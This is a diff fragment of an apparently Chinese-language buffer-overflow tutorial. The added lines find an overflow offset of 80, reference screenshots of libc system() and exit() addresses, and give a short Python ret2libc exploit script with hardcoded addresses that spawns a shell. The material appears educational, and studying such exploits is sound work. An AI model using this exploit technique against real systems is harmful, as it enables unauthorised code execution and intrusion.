@@ -90,11 +90,31 @@ x/s \* \(\(char \*\*\)environ+x\)   x是一个数字，然后就打印出相应�
 
 ![](/png/29.png)
 
+溢出点出现。
+
+![](/png/30.png)
+
+偏移80的地方。此时查看system\(\)和exit\(\)地址
+
+![](/png/31.png)
 
 
 
+5）编写漏洞利用代码exploit.py
 
+    结构如下：
 
+import struct
+
+buff = 'A'\*80
+
+system = struct.pack\("I",0xb7ecffb0\)
+
+exit = struct.pack\("I",0xb7ec60c0\)
+
+shell = struct.pack\("I",0xbfffff82\)
+
+print buff+system+exit+shell
 
 ref：
 
